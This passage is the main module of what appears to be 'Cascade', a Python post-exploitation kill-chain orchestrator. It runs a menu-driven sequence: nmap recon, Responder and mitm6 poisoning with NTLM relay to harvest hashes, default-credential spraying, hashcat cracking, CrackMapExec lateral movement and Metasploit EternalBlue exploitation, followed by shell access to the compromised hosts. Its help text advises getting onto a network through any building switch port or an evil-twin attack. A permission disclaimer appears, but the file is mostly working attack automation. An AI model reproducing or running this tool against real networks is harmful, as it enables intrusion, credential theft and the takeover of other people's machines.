#!/usr/bin/env python3
"""
Cascade — Post-Exploitation Orchestrator
Only run against networks you own or have explicit written permission to test.
"""

import os, sys, shutil, subprocess, time, json, socket
from pathlib import Path

from . import tui, iface, logger
from . import recon, harvest, spray, crack, lateral, shells, vault, exploit, watch

# ── Pi-side persistent config ─────────────────────────────────────────────────
# Stored at /root/.cascade/config.json — separate from the vault.
# Used to remember the Windows GPU machine's Tailscale IP, SSH user, etc.

_PI_CONFIG_FILE = Path(os.path.expanduser("~/.cascade/config.json"))

def _pi_cfg_load() -> dict:
    if _PI_CONFIG_FILE.exists():
        try:
            return json.loads(_PI_CONFIG_FILE.read_text())
        except Exception:
            pass
    return {}

def _pi_cfg_save(cfg: dict):
    _PI_CONFIG_FILE.parent.mkdir(parents=True, exist_ok=True)
    _PI_CONFIG_FILE.write_text(json.dumps(cfg, indent=2))


# ── session state ─────────────────────────────────────────────────────────────

class State:
    def __init__(self):
        self.interface    = "eth0"   # LAN interface (for nmap, Responder)
        self.subnet       = None     # None = auto-detect
        self.target_host  = None     # None = all hosts
        self.harvest_time = 120
        self.wordlist     = None
        self.verbose      = False
        self.full_scan    = False
        self.skip_harvest = False
        # runtime results
        self.hosts        = []
        self.hashes       = []
        self.spray_creds  = []
        self.cracked      = []
        self.compromised  = []

    def all_creds(self) -> list[dict]:
        return self.spray_creds + [
            {"target": "N/A", "service": "ntlmv2",
             "user": c["user"], "secret": c["password"]}
            for c in self.cracked
        ]

    def effective_subnet(self) -> str:
        if self.subnet:
            return self.subnet
        detected = iface.get_subnet(self.interface)
        return detected or "unknown"

    def status_bar(self) -> str:
        iface_info = _iface_status(self.interface)
        subnet_str = self.effective_subnet()
        target_str = self.target_host or "all hosts"

        results = []
        if self.hosts:       results.append(f"{tui.GRN}{len(self.hosts)} hosts{tui.R}")
        if self.hashes:      results.append(f"{tui.YLW}{len(self.hashes)} hashes{tui.R}")
        if self.spray_creds: results.append(f"{tui.GRN}{len(self.spray_creds)} creds{tui.R}")
        if self.cracked:     results.append(f"{tui.GRN}{len(self.cracked)} cracked{tui.R}")
        if self.compromised: results.append(f"{tui.RED}{tui.B}{len(self.compromised)} PWNED{tui.R}")
        result_str = "  │  ".join(results) if results else f"{tui.DIM}no results yet{tui.R}"

        return (
            f"  {tui.DIM}Interface :{tui.R} {iface_info}\n"
            f"  {tui.DIM}Subnet    :{tui.R} {tui.WH}{subnet_str}{tui.R}  "
            f"{tui.DIM}Target:{tui.R} {tui.WH}{target_str}{tui.R}\n"
            f"  {tui.DIM}Session   :{tui.R} {result_str}"
        )


def _context_hint(state: State):
    """Print a single dimmed line showing current target/adapter + how to change."""
    ifaces = iface.list_interfaces()
    cur = next((i for i in ifaces if i["name"] == state.interface), None)
    mode    = cur["mode"] if cur and cur["mode"] else "wired"
    ip      = cur["ip"]   if cur else None
    m_col   = tui.RED if "MONITOR" in mode else tui.GRN
    ip_str  = ip or f"{tui.RED}no IP{tui.DIM}"
    subnet  = state.effective_subnet()
    target  = state.target_host or "all hosts"
    print(
        f"  {tui.DIM}┤ adapter: {tui.R}{tui.WH}{state.interface}{tui.DIM}"
        f"  [{m_col}{mode}{tui.DIM}]"
        f"  ip: {tui.R}{tui.WH}{ip_str}{tui.DIM}"
        f"  subnet: {tui.R}{tui.WH}{subnet}{tui.DIM}"
        f"  target: {tui.R}{tui.WH}{target}{tui.DIM}"
        f"  ·  to change any of this → {tui.R}{tui.WH}s → Setup{tui.DIM} from main menu ├{tui.R}"
    )
    print()


def _iface_status(name: str) -> str:
    for i in iface.list_interfaces():
        if i["name"] == name:
            ip  = i["ip"] or tui.YLW + "no IP" + tui.R
            mode = f"  {tui.DIM}[{i['mode']}]{tui.R}" if i["mode"] != "?" else ""
            ok   = tui.GRN if i["ip"] else tui.RED
            return f"{ok}{tui.B}{name}{tui.R}  {tui.WH}{ip}{tui.R}{mode}"
    return f"{tui.DIM}{name} (not found){tui.R}"


# ── stage runners (with confirm) ──────────────────────────────────────────────

def _confirm(stage_name: str, detail: str, noise: str, state: State = None) -> str:
    """
    Ask user to continue, skip, or stop.
    Returns 'run', 'skip', or 'stop'.
    """
    if state:
        _context_hint(state)
    tui.divider()
    print(f"\n  {tui.RED}{tui.B}{stage_name}{tui.R}")
    print(f"  {tui.DIM}{detail}{tui.R}")
    print(f"  {tui.YLW}Noise level: {noise}{tui.R}\n")
    while True:
        raw = input(f"  {tui.WH}{tui.B}[Y] run  [s] skip  [q] stop here → {tui.R}").strip().lower()
        if raw in ("", "y"):  return "run"
        if raw == "s":        return "skip"
        if raw == "q":        return "stop"


def _require_managed(state: State) -> bool:
    """Check adapter is in managed mode before running network-facing stages."""
    if not iface.ensure_managed(state.interface):
        tui.error("Cannot run this stage in monitor mode. Switch to managed first.")
        return False
    if not iface.has_ip(state.interface):
        tui.error(f"{state.interface} has no IP — connect to the network first (Setup → 3 or 4).")
        return False
    return True


def run_stage1(state: State) -> bool:
    if not _require_managed(state):
        return True   # don't stop chain, just skip
    decision = _confirm(
        "STAGE 1 — RECON",
        f"nmap scan of {state.effective_subnet()}. Finds live hosts, ports, services.",
        "LOW — passive scan, no exploitation",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 1 skipped."); return True

    tui.phase("STAGE 1 — RECON")
    hosts = recon.scan(
        subnet  = state.subnet,
        fast    = not state.full_scan
    )
    state.hosts = hosts
    if not hosts:
        tui.warn("No hosts found. Check interface and subnet.")
    else:
        tui.success(f"Found {len(hosts)} host(s)")
        tui.host_table(hosts)
    return True


def run_stage2(state: State) -> bool:
    if not _require_managed(state):
        return True
    if state.skip_harvest:
        tui.warn("Stage 2 skipped (skip-harvest is ON).")
        return True

    decision = _confirm(
        "STAGE 2 — HASH HARVEST",
        f"Responder poisons LLMNR/NBT-NS on {state.interface} for {state.harvest_time}s.\n"
        f"  Relay mode also runs mitm6 (IPv6 DNS poisoning) to force auth without user interaction.",
        "MEDIUM — poisoning LLMNR/NBT-NS/DHCPv6, visible in Wireshark",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 2 skipped."); return True

    tui.phase("STAGE 2 — HASH HARVEST")

    # Offer relay attack if any SMB targets have signing disabled
    relay_targets = []
    if state.hosts:
        relay_targets = harvest.relay_targets_from_hosts(state.hosts)

    print(f"  {tui.WH}How do you want to harvest credentials?{tui.R}")
    print(f"  {tui.RED}{tui.B}1{tui.R}  Passive          — Responder captures hashes (user must trigger auth)")
    print(f"  {tui.RED}{tui.B}2{tui.R}  Passive + mitm6  — DHCPv6 poison forces Windows to auto-authenticate")
    if relay_targets:
        print(f"  {tui.RED}{tui.B}3{tui.R}  Relay + mitm6    — relay auth to {len(relay_targets)} SMB target(s) in real-time")
        print(f"  {tui.RED}{tui.B}4{tui.R}  Relay then passive — relay first, fall back to capture")
    print()
    choice = input(f"  {tui.WH}{tui.B}→ [2]: {tui.R}").strip() or "2"

    use_mitm6 = choice in ("2",)

    if choice in ("3", "4") and relay_targets:
        tui.info("Starting NTLM relay attack ...")
        relay_hits = harvest.start_relay(relay_targets, state.interface,
                                         timeout=state.harvest_time)
        if relay_hits:
            tui.success(f"Relay succeeded on {len(relay_hits)} host(s)!")
            for h in relay_hits:
                tui.success(f"  {h['user']} → {h['ip']}")
            for h in relay_hits:
                state.spray_creds.append({"user": h["user"], "secret": "",
                                          "service": "smb", "target": h["ip"],
                                          "relay": True})
        if choice == "4" and not relay_hits:
            use_mitm6 = True   # relay failed, fall back to passive+mitm6

    if choice in ("1", "2") or (choice == "4" and not state.spray_creds):
        hashes = harvest.wait_and_capture(state.interface, timeout=state.harvest_time,
                                          use_mitm6=use_mitm6)
        state.hashes = hashes
        if hashes:
            tui.success(f"Captured {len(hashes)} hash(es)")
            for h in hashes:
                print(f"    {tui.DIM}{h[:80]}{'…' if len(h) > 80 else ''}{tui.R}")
        else:
            tui.warn("No hashes captured — network may be quiet or Responder blocked")

    return True


def run_stage3(state: State) -> bool:
    if not state.hosts:
        tui.warn("No hosts from Stage 1 — run recon first or skip.")

    decision = _confirm(
        "STAGE 3 — CREDENTIAL SPRAY",
        f"Tries default credentials (admin/admin, root/root, etc.) against\n"
        f"  SSH, SMB, and HTTP admin panels on {len(state.hosts)} discovered host(s).",
        "MEDIUM — login attempts, may trigger lockout policies",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 3 skipped."); return True

    tui.phase("STAGE 3 — CREDENTIAL SPRAY")
    if not state.hosts:
        tui.warn("No hosts to spray.")
        return True

    results = spray.spray(state.hosts, verbose=state.verbose)
    state.spray_creds = results
    if results:
        tui.success(f"Found {len(results)} valid credential(s)")
        tui.cred_table(results)
    else:
        tui.warn("No default credentials found")
    return True


def run_stage4(state: State) -> bool:
    if not state.hashes:
        tui.warn("No hashes from Stage 2.")

    decision = _confirm(
        "STAGE 4 — HASH CRACKING",
        f"hashcat NTLMv2 (mode 5600): plain dictionary → best64 rules → d3ad0ne → dive.\n"
        f"  {len(state.hashes)} hash(es) queued. Stops as soon as all hashes crack.",
        "LOW — local CPU/GPU, no network traffic",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 4 skipped."); return True

    tui.phase("STAGE 4 — HASH CRACKING")
    if not state.hashes:
        # offer manual paste
        print(f"  {tui.DIM}No hashes from Responder. Paste NTLMv2 hashes below (empty line to finish):{tui.R}\n")
        lines = []
        while True:
            try:
                line = input("  ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not line:
                break
            lines.append(line)
        state.hashes = lines

    # Quick CPU attempt — saves everything to vault; uncracked marked pending for GPU
    target_ip = state.target_host or "unknown"
    cracked = crack.crack_ntlmv2_quick(state.hashes, target_ip=target_ip)
    state.cracked = cracked

    pending = vault.pending_hashes()
    if cracked:
        tui.success(f"Cracked {len(cracked)} hash(es)")
    if pending:
        tui.warn(f"{len(pending)} hash(es) unsolved — export to CascadeCracker for GPU cracking")
        tui.info("  Vault → Export hashes  (menu option v)")
    if not cracked and not pending:
        tui.warn("No hashes to crack")
    return True


def run_stage5(state: State) -> bool:
    creds = state.all_creds()
    if not creds:
        tui.warn("No credentials available for lateral movement.")

    decision = _confirm(
        "STAGE 5 — LATERAL MOVEMENT",
        f"CrackMapExec over SMB/WinRM + SSH with {len(creds)} credential(s)\n"
        f"  against {len(state.hosts)} host(s).",
        "HIGH — active login attempts on every host, very noisy",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 5 skipped."); return True

    tui.phase("STAGE 5 — LATERAL MOVEMENT")
    if not creds:
        tui.warn("No credentials to use.")
        return True

    host_map    = {h["ip"]: h for h in state.hosts}
    raw_results = lateral.run_kill_chain(state.hosts, creds)
    compromised = []
    for r in raw_results:
        if r.get("pwned"):
            host = host_map.get(r["ip"], {"ip": r["ip"], "hostname": "", "ports": []})
            cred = next((c for c in creds if c["user"] == r.get("user")), creds[0])
            compromised.append({"host": host, "cred": cred})

    state.compromised = compromised
    if compromised:
        tui.success(f"Gained access to {len(compromised)} host(s)")
    else:
        tui.warn("No lateral movement succeeded")
    return True


def run_stage6(state: State) -> bool:
    """Stage 6 — Metasploit automated exploitation."""
    decision = _confirm(
        "STAGE 6 — EXPLOIT",
        f"Metasploit auto-exploit against {len(state.hosts)} discovered host(s).\n"
        f"  Checks MS17-010 (EternalBlue), exploits vulnerable targets,\n"
        f"  dumps NT hashes from sessions and feeds them back to vault.",
        "HIGH — active exploitation, very noisy, may crash unpatched targets",
        state
    )
    if decision == "stop": return False
    if decision == "skip": tui.warn("Stage 6 skipped."); return True

    tui.phase("STAGE 6 — EXPLOIT")
    if not state.hosts:
        tui.warn("No hosts found — run recon first.")
        return True

    results = exploit.run_exploit_chain(state.hosts)
    for r in results:
        if r.get("success"):
            state.compromised.append({
                "host": next((h for h in state.hosts if h["ip"] == r["ip"]),
                             {"ip": r["ip"], "hostname": "", "ports": []}),
                "cred": {"user": "SYSTEM", "secret": "", "service": "msf"},
                "method": "eternalblue",
            })
    return True


# ── full kill chain ───────────────────────────────────────────────────────────

def run_full_chain(state: State):
    tui.clear()
    tui.print_banner()
    tui.phase("KILL CHAIN")
    tui.info(f"Interface : {state.interface}")
    tui.info(f"Subnet    : {state.effective_subnet()}")
    tui.info(f"Target    : {state.target_host or 'all hosts'}")
    tui.info(f"Harvest   : {'skip' if state.skip_harvest else str(state.harvest_time) + 's'}")
    print()

    try:
        if not run_stage1(state): return
        if not run_stage2(state): return
        if not run_stage3(state): return
        if not run_stage4(state): return
        if not run_stage5(state): return
        if not run_stage6(state): return
    except KeyboardInterrupt:
        print(f"\n\n  {tui.DIM}Interrupted.{tui.R}\n")

    _print_summary(state)

    if state.compromised:
        ans = input(f"\n  {tui.WH}{tui.B}Open shell manager? [Y/n] {tui.R}").strip().lower()
        if ans != "n":
            shells.access_menu(state.compromised)
    elif state.all_creds():
        guesses = [
            {"host": h, "cred": state.all_creds()[0]}
            for h in state.hosts
            if any(p in (h.get("ports") or []) for p in [22, 445, 5985])
        ]
        if guesses:
            ans = input(f"\n  {tui.WH}{tui.B}Try manual shell with found credentials? [Y/n] {tui.R}").strip().lower()
            if ans != "n":
                shells.access_menu(guesses)


def _print_summary(state: State):
    tui.phase("RESULTS")
    tui.stage_result("Recon",         bool(state.hosts),        f"{len(state.hosts)} host(s)")
    tui.stage_result("Hash Harvest",  bool(state.hashes),       f"{len(state.hashes)} hash(es)")
    tui.stage_result("Cred Spray",    bool(state.spray_creds),  f"{len(state.spray_creds)} valid")
    tui.stage_result("Hash Cracking", bool(state.cracked),      f"{len(state.cracked)} cracked")
    tui.stage_result("Lateral Move",  bool(state.compromised),  f"{len(state.compromised)} PWNED")
    eb = [e for e in state.compromised if e.get("method") == "eternalblue"]
    if eb:
        tui.stage_result("Exploit",   True,  f"{len(eb)} via EternalBlue")

    if state.all_creds():
        print()
        tui.success("Valid credentials:")
        tui.cred_table(state.all_creds())

    if state.compromised:
        print()
        tui.success("Compromised hosts:")
        for e in state.compromised:
            h = e["host"]; c = e["cred"]
            print(f"    {tui.GRN}{tui.B}{h['ip']:<16}{tui.R}  "
                  f"{tui.DIM}{h.get('hostname','')}  as {c['user']}{tui.R}")
    print()


# ── startup adapter wizard ────────────────────────────────────────────────────

def adapter_wizard(state: State):
    """
    Shown before the main menu (and from Setup → 1).
    Pick an adapter → automatically fix modes → connect if needed.
    No explanations about what modes mean — just pick and it handles it.
    """
    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("SELECT YOUR ADAPTER")

        interfaces = iface.list_interfaces()
        if not interfaces:
            tui.error("No network interfaces found.")
            input(f"  {tui.DIM}[ press Enter ]{tui.R}")
            return

        print(f"  {tui.WH}{tui.B}  #  NAME          IP ADDRESS        STATUS{tui.R}")
        tui.divider()
        for i, fc in enumerate(interfaces, 1):
            if fc["ip"]:
                status = f"{tui.GRN}connected  {fc['ip']}{tui.R}"
            elif fc["wireless"]:
                status = f"{tui.YLW}not connected (wireless){tui.R}"
            else:
                status = f"{tui.YLW}not connected (wired){tui.R}"
            cur = f"  {tui.RED}{tui.B}← current{tui.R}" if fc["name"] == state.interface else ""
            print(
                f"  {tui.DIM}{i:>2}{tui.R}  "
                f"{tui.WH}{tui.B}{fc['name']:<12}{tui.R}  "
                f"{status}{cur}"
            )
        tui.divider()
        print(f"\n  {tui.DIM}0 / Enter → keep current ({state.interface}){tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}adapter → {tui.R}").strip()
        if raw in ("0", ""):
            return

        try:
            idx = int(raw) - 1
        except ValueError:
            continue
        if not (0 <= idx < len(interfaces)):
            continue

        picked = interfaces[idx]
        state.interface = picked["name"]
        state.subnet    = None

        # Auto-fix 802.11 mode silently
        if picked["wireless"] and picked["mode"] and "MONITOR" in picked["mode"]:
            tui.info(f"Switching {picked['name']} from MONITOR → MANAGED ...")
            iface.set_mode(picked["name"], "managed")

        # Bring interface up if needed (wpa_supplicant handles connection for NM-unmanaged)
        subprocess.call(["ip", "link", "set", picked["name"], "up"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        tui.success(f"Adapter set to {tui.WH}{tui.B}{picked['name']}{tui.R}")

        # If no IP, ask how to connect
        if not picked["ip"]:
            print()
            tui.warn(f"{picked['name']} is not connected to any network.")
            print(f"\n  {tui.RED}{tui.B}1{tui.R}  Scan for WiFi networks and connect")
            print(f"  {tui.RED}{tui.B}2{tui.R}  Open nmtui")
            print(f"  {tui.RED}{tui.B}3{tui.R}  Skip — using ethernet / will connect manually\n")
            choice = input(f"  {tui.WH}{tui.B}→ {tui.R}").strip()
            if choice == "1":
                wifi_connect_flow(state)
            elif choice == "2":
                iface.launch_nmtui()
        return


# ── WiFi scan + connect flow ──────────────────────────────────────────────────

def wifi_connect_flow(state: State):
    """
    Scan for nearby WiFi networks on the current adapter,
    let user pick one, ask for password, and connect.
    """
    tui.clear()
    tui.print_banner()
    tui.phase(f"WIFI SCAN — {state.interface}")

    networks = iface.scan_wifi(state.interface)
    if not networks:
        tui.warn("No networks found. Make sure the adapter is up and in managed mode.")
        input(f"\n  {tui.DIM}[ press Enter to go back ]{tui.R}")
        return

    tui.success(f"Found {len(networks)} network(s)")
    iface.print_wifi_table(networks)

    print(f"\n  {tui.DIM}Enter number to connect  |  r to rescan  |  0 / Enter → back{tui.R}\n")
    raw = input(f"  {tui.WH}{tui.B}network → {tui.R}").strip().lower()

    if raw in ("0", ""):
        return
    if raw == "r":
        wifi_connect_flow(state)
        return

    try:
        idx = int(raw) - 1
    except ValueError:
        return
    if not (0 <= idx < len(networks)):
        return

    target = networks[idx]
    ssid   = target["ssid"]
    sec    = target["security"]

    tui.info(f"Target: {tui.WH}{tui.B}{ssid}{tui.R}  [{sec}]  BSSID: {target['bssid']}")

    password = None
    if sec != "OPEN":
        password = input(f"\n  {tui.WH}Password for '{ssid}': {tui.R}").strip()
        if not password:
            tui.warn("No password entered — aborting.")
            return

    if iface.connect_wifi(state.interface, ssid, password, bssid=target["bssid"]):
        state.subnet = None    # force re-detect now that we have an IP
        tui.success(f"Connected. Subnet: {tui.WH}{state.effective_subnet()}{tui.R}")
    else:
        tui.error("Failed to connect. Wrong password or network unavailable.")

    input(f"\n  {tui.DIM}[ press Enter to continue ]{tui.R}")


# ── setup menu ────────────────────────────────────────────────────────────────

def setup_menu(state: State):
    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("SETUP")

        # Guidance box
        # Current state summary
        cur_iface = next(
            (i for i in iface.list_interfaces() if i["name"] == state.interface),
            None
        )
        ip_str   = (cur_iface["ip"] if cur_iface and cur_iface["ip"]
                    else f"{tui.RED}no IP — not connected{tui.R}")
        mode_str = (cur_iface["mode"] if cur_iface and cur_iface["mode"]
                    else "wired")
        m_col    = (tui.RED if cur_iface and cur_iface["mode"]
                    and "MONITOR" in cur_iface["mode"] else tui.GRN)
        mode_warn = (f"  {tui.RED}{tui.B}← switch to MANAGED before attacking!{tui.R}"
                     if cur_iface and cur_iface["mode"]
                     and "MONITOR" in cur_iface["mode"] else "")

        print(f"  {tui.DIM}Adapter :{tui.R}  {tui.WH}{tui.B}{state.interface}{tui.R}"
              f"  {m_col}[{mode_str}]{tui.R}  {tui.WH}{ip_str}{tui.R}{mode_warn}")
        print(f"  {tui.DIM}Subnet  :{tui.R}  {tui.WH}{state.subnet or 'auto-detect'}{tui.R}")
        print(f"  {tui.DIM}Target  :{tui.R}  {tui.WH}{state.target_host or 'all hosts'}{tui.R}")
        print()
        tui.divider()

        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}Change adapter{tui.R}"
              f"          {tui.DIM}re-run adapter wizard — pick, auto-fix modes{tui.R}")
        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Scan WiFi + connect{tui.R}"
              f"     {tui.DIM}scan nearby networks, pick one, enter password{tui.R}")
        print(f"  {tui.RED}{tui.B} 3{tui.R}  {tui.WH}Connect via nmtui{tui.R}"
              f"       {tui.DIM}full interactive network manager (fallback){tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 4{tui.R}  {tui.WH}Set subnet manually{tui.R}"
              f"     {tui.DIM}current: {state.subnet or 'auto-detect'}{tui.R}")
        print(f"  {tui.RED}{tui.B} 5{tui.R}  {tui.WH}Set target host{tui.R}"
              f"         {tui.DIM}current: {state.target_host or 'all hosts'}{tui.R}")
        print(f"  {tui.RED}{tui.B} 6{tui.R}  {tui.WH}Set Responder window{tui.R}"
              f"    {tui.DIM}current: {state.harvest_time}s{tui.R}")
        print(f"  {tui.RED}{tui.B} 7{tui.R}  {tui.WH}Set custom wordlist{tui.R}"
              f"     {tui.DIM}current: {state.wordlist or 'rockyou.txt'}{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 8{tui.R}  {tui.WH}Toggle skip-harvest{tui.R}"
              f"     {tui.DIM}{'ON — Responder skipped' if state.skip_harvest else 'off'}{tui.R}")
        print(f"  {tui.RED}{tui.B} 9{tui.R}  {tui.WH}Toggle verbose{tui.R}"
              f"          {tui.DIM}{'on' if state.verbose else 'off'}{tui.R}")
        print(f"  {tui.RED}{tui.B}10{tui.R}  {tui.WH}Tool status{tui.R}"
              f"             {tui.DIM}what's installed, what's missing{tui.R}")
        _wcfg = _pi_cfg_load()
        _whost = _wcfg.get("windows_host", "not set")
        print(f"  {tui.RED}{tui.B}11{tui.R}  {tui.WH}Configure GPU machine{tui.R}"
              f"   {tui.DIM}Windows host for remote GPU crack  [{_whost}]{tui.R}")
        tui.divider()
        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}setup → {tui.R}").strip()

        if raw in ("0", ""):
            return

        elif raw == "1":
            adapter_wizard(state)

        elif raw == "2":
            wifi_connect_flow(state)

        elif raw == "3":
            iface.launch_nmtui()

        elif raw == "4":
            v = input(f"\n  {tui.WH}Subnet CIDR (blank = auto): {tui.R}").strip()
            state.subnet = v or None
            tui.success(f"Subnet: {state.subnet or 'auto-detect'}")
            time.sleep(0.8)

        elif raw == "5":
            v = input(f"\n  {tui.WH}Target IP (blank = all hosts): {tui.R}").strip()
            state.target_host = v or None
            tui.success(f"Target: {state.target_host or 'all hosts'}")
            time.sleep(0.8)

        elif raw == "6":
            v = input(f"\n  {tui.WH}Responder window seconds [{state.harvest_time}]: {tui.R}").strip()
            try:
                state.harvest_time = int(v)
                tui.success(f"Harvest time: {state.harvest_time}s")
            except ValueError:
                tui.warn("Invalid number.")
            time.sleep(0.8)

        elif raw == "7":
            v = input(f"\n  {tui.WH}Wordlist path (blank = default): {tui.R}").strip()
            state.wordlist = v or None
            tui.success(f"Wordlist: {state.wordlist or 'default'}")
            time.sleep(0.8)

        elif raw == "8":
            state.skip_harvest = not state.skip_harvest
            tui.success(f"Skip-harvest: {'ON' if state.skip_harvest else 'off'}")
            time.sleep(0.8)

        elif raw == "9":
            state.verbose = not state.verbose
            tui.success(f"Verbose: {'on' if state.verbose else 'off'}")
            time.sleep(0.8)

        elif raw == "10":
            tui.clear(); tui.print_banner(); tui.phase("TOOL STATUS")
            iface.print_tool_status()
            input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")

        elif raw == "11":
            _setup_gpu_machine()


# ── about / help ──────────────────────────────────────────────────────────────

def _print_about():
    from . import __version__
    tui.clear()
    tui.print_banner()
    print(f"""  {tui.WH}{tui.B}CASCADE  v{__version__}  —  Post-Exploitation Kill Chain Orchestrator{tui.R}

  Cascade automates the internal network kill chain. Once you have a
  foothold on a LAN segment (ethernet, evil twin, open port) it chains
  five stages into a guided, menu-driven attack flow.

  {tui.RED}{tui.B}STAGE 1 — Recon{tui.R}
    nmap sweeps the subnet. Finds live hosts, open ports, services, OS.
    Noise: LOW. Takes 30-90 seconds.

  {tui.RED}{tui.B}STAGE 2 — Hash Harvest (Responder){tui.R}
    Poisons LLMNR / NBT-NS / WPAD. Windows machines automatically hand
    over NTLMv2 hashes when they try to resolve any name. You just wait.
    Noise: MEDIUM. Visible in Wireshark. Runs for a configurable window.

  {tui.RED}{tui.B}STAGE 3 — Credential Spray{tui.R}
    Tries default/common creds (admin/admin, root/root, pi/raspberry...)
    against SSH, SMB, and HTTP admin panels on every discovered host.
    Noise: MEDIUM. Login attempts logged on target systems.

  {tui.RED}{tui.B}STAGE 4 — Hash Cracking{tui.R}
    hashcat NTLMv2 (mode 5600) against rockyou.txt or custom wordlist.
    Noise: ZERO — local CPU/GPU only.

  {tui.RED}{tui.B}STAGE 5 — Lateral Movement{tui.R}
    CrackMapExec over SMB/WinRM + paramiko over SSH. If any cred is a
    local admin on a host, it shows Pwn3d! — full command execution.
    Noise: HIGH — many login attempts across the network.

  {tui.WH}{tui.B}ADAPTER STATE{tui.R}
    Cascade uses a LAN interface (eth0, wlan0, etc.) in {tui.YLW}MANAGED{tui.R} mode.
    Do NOT put the interface in monitor mode — Responder and nmap need
    normal (managed) operation. Monitor mode is for WiFi capture tools
    like Fracture, wifite, and airgeddon.

  {tui.WH}{tui.B}GETTING ON THE NETWORK{tui.R}
    You must be on the same LAN as your targets before running Cascade.
    Options:
    - {tui.DIM}Ethernet: plug into any switch port in the building{tui.R}
    - {tui.DIM}WiFi: use nmtui (option 9 in Setup) to connect to the target network{tui.R}
    - {tui.DIM}Evil twin: use airgeddon/portal_cloner to get the WiFi password first{tui.R}

  {tui.WH}{tui.B}REQUIRED TOOLS{tui.R}
    {tui.DIM}sudo apt install nmap responder hashcat crackmapexec sshpass smbclient python3-impacket{tui.R}
    {tui.DIM}sudo gem install evil-winrm{tui.R}

  {tui.DIM}Only run against networks you own or have explicit permission to test.{tui.R}
""")
    input(f"  {tui.DIM}[ press Enter to go back ]{tui.R}")


# ── vault menu ────────────────────────────────────────────────────────────────

def vault_menu(state: State):
    """Browse captured hashes, cracked passwords, export for GPU cracking."""
    while True:
        tui.clear()
        tui.print_banner()
        tui.phase("VAULT")

        vc = vault.cracked_entries()
        vp = vault.pending_hashes()
        va = vault.all_entries()

        print(f"  {tui.GRN}{tui.B}{len(vc)} cracked{tui.R}    "
              f"{tui.YLW}{len(vp)} pending GPU{tui.R}    "
              f"{tui.DIM}{len(va)} total{tui.R}")
        print()
        tui.divider()
        print(f"  {tui.RED}{tui.B}1{tui.R}  View all hashes          "
              f"{tui.DIM}captured NTLMv2/NTLM hashes with status{tui.R}")
        print(f"  {tui.RED}{tui.B}2{tui.R}  View cracked passwords   "
              f"{tui.DIM}all plaintext credentials recovered{tui.R}")
        print(f"  {tui.RED}{tui.B}3{tui.R}  Export pending hashes    "
              f"{tui.DIM}write hash file for CascadeCracker (GPU){tui.R}")
        print(f"  {tui.RED}{tui.B}4{tui.R}  Import cracked results   "
              f"{tui.DIM}load potfile back from CascadeCracker{tui.R}")
        print(f"  {tui.RED}{tui.B}5{tui.R}  Shell from vault         "
              f"{tui.DIM}connect to any cracked host right now{tui.R}")
        tui.divider()
        print(f"\n  {tui.DIM}   0 / Enter → back{tui.R}\n")

        raw = input(f"  {tui.WH}{tui.B}vault → {tui.R}").strip().lower()

        if raw in ("0", ""):
            return

        elif raw == "1":
            tui.clear(); tui.print_banner(); tui.phase("ALL HASHES")
            vault.print_hashes()
            input(f"  {tui.DIM}[ press Enter ]{tui.R}")

        elif raw == "2":
            tui.clear(); tui.print_banner(); tui.phase("CRACKED PASSWORDS")
            vault.print_cracked()
            input(f"  {tui.DIM}[ press Enter ]{tui.R}")

        elif raw == "3":
            if not vp:
                tui.warn("No pending hashes to export.")
                time.sleep(1)
                continue
            from . import vault as _v
            out = _v.export_hash_file()
            tui.success(f"Exported {len(vp)} hash(es) to: {tui.WH}{out}{tui.R}")
            tui.info("Copy this file to your Windows machine and run CascadeCracker.")
            tui.info(f"  scp {out} user@windowspc:~/")
            input(f"\n  {tui.DIM}[ press Enter ]{tui.R}")

        elif raw == "4":
            pot = input(f"  {tui.WH}Path to potfile / cracked output: {tui.R}").strip()
            if not pot:
                continue
            n = vault.import_cracked_file(pot)
            if n:
                tui.success(f"Updated {n} vault entry(s) from {pot}")
            else:
                tui.warn("No matches found in that file.")
            time.sleep(1)

        elif raw == "5":
            cracked = vault.cracked_entries()
            if not cracked:
                tui.warn("No cracked credentials in vault yet.")
                time.sleep(1)
                continue
            # Build compromised list from vault entries + known hosts
            entries = []
            host_map = {h["ip"]: h for h in state.hosts}
            for e in cracked:
                ip   = e["target_ip"]
                host = host_map.get(ip, {"ip": ip, "hostname": "", "ports": [22, 445, 5985]})
                cred = {"user": e["username"], "secret": e["password"]}
                entries.append({"host": host, "cred": cred})
            shells.access_menu(entries)


# ── main menu ─────────────────────────────────────────────────────────────────

def _warn_missing(state: State):
    """One-line missing tool warning for status bar."""
    missing = [t["tool"] for t in iface.check_tools() if not t["found"]]
    if missing:
        return (f"\n  {tui.YLW}{tui.B}Missing tools:{tui.R} "
                f"{tui.DIM}{', '.join(missing[:4])}{'...' if len(missing) > 4 else ''}"
                f"  (run Setup → 10 for details){tui.R}")
    return ""


def _warn_no_ip(state: State):
    """Warn if selected interface has no IP."""
    if not iface.has_ip(state.interface):
        return (f"\n  {tui.RED}{tui.B}[!]{tui.R} {tui.YLW}{state.interface} has no IP address "
                f"— not connected to a network. Go to Setup → Connect (9).{tui.R}")
    return ""


def main_menu(state: State):
    while True:
        tui.clear()
        tui.print_banner()

        print(state.status_bar())
        print(_warn_no_ip(state))
        print(_warn_missing(state))
        print()
        tui.divider()

        print(f"  {tui.RED}{tui.B} 1{tui.R}  {tui.WH}{tui.B}Full kill chain{tui.R}"
              f"  {tui.DIM}guided: recon → harvest → spray → crack → lateral → shells{tui.R}")
        print()
        print(f"  {tui.RED}{tui.B} 2{tui.R}  {tui.WH}Recon{tui.R}"
